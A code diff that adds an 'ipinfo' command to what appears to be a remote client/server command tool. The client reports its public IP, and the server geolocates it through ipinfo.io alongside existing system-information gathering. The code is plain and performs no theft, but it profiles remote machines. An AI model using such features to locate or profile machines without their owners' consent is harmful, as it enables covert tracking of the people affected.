@@ -1,3 +1,4 @@
+from server_extras.client import Client
 from shared.extras.double_command import (
     DoubleCommandResult,
     add_double_command,
@@ -1775,3 +1776,51 @@ class GatherSystemInformation(DoubleCommand):
         for key, value in output.items():
             print(f"{key}{' ' * (14 - len(key))} -> {value}")
         return CommandResult(DoubleCommandResult.success, output)
+
+
+@add_double_command(
+    "ipinfo",
+    "ipinfo [ api key for ipinfo.io ]",
+    "Gets information about the client IP",
+    [ArgumentType.string],
+    dict,
+    required_server_modules=["ipinfo"],
+)
+class Geolocate(DoubleCommand):
+    @staticmethod
+    def client_side(sock: socket.socket) -> None:
+        import urllib.request
+
+        try:
+            sock.sendall(urllib.request.urlopen("https://api.ipify.org").read())
+        except OSError:
+            return
+
+    @staticmethod
+    def server_side(client: Client, params: tuple) -> CommandResult:
+        from typing import Any
+        import ipinfo
+
+        def indent_print(item: dict[str, Any], indent: int = 0) -> None:
+            longest_key_len = max([len(key) for key in item])
+            for key, value in item.items():
+                if isinstance(value, dict):
+                    print(f"{' ' * indent}{key.title().replace("_", " ")} {'-' * ((longest_key_len + 6) - len(key))}>")
+                    indent_print(value, indent + 4)
+                else:
+                    print(f"{' ' * indent}{key.title().replace("_", " ")} {'-' * ((longest_key_len + 1) - len(key))}> {value}")
+
+        try:
+            target_ip = client.socket.recv(39).decode(
+                "utf-8"
+            )  # 39 characters for an IPv6 address
+        except OSError:
+            print("Failed to recieve client ip, defaulting to stored one.")
+            target_ip = client.ip
+
+        handler = ipinfo.getHandler(params[0])
+        info = handler.getDetails(target_ip)
+
+        indent_print(info.all)
+
+        return CommandResult(DoubleCommandResult.success, info.all)
